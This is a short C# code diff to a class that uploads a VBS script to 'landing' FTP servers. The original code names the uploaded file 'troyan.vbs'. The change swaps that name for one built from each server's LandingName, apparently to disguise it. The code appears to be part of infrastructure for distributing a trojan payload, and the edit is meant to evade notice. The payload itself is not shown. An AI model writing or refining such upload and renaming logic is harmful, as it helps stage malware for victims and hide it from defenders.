@@ -50,8 +50,9 @@ public sealed class LandingFtpMaintenance : ILandingFtpMaintenance
             try
             {
                 var uri = new Uri(server.LandingFtp.Trim(), UriKind.Absolute);
-                LandingFtpUploader.UploadFile(uri, vbs, "troyan.vbs");
-                _logger.LogInformation("Landing FTP uploaded troyan.vbs to {Scheme}://{Host}{Path}", uri.Scheme, uri.Host, uri.AbsolutePath);
+                var remoteFileName = $"{server.LandingName}.vbs";
+                LandingFtpUploader.UploadFile(uri, vbs, remoteFileName);
+                _logger.LogInformation("Landing FTP uploaded {RemoteFile} to {Scheme}://{Host}{Path}", remoteFileName, uri.Scheme, uri.Host, uri.AbsolutePath);
             }
             catch (Exception ex)
             {
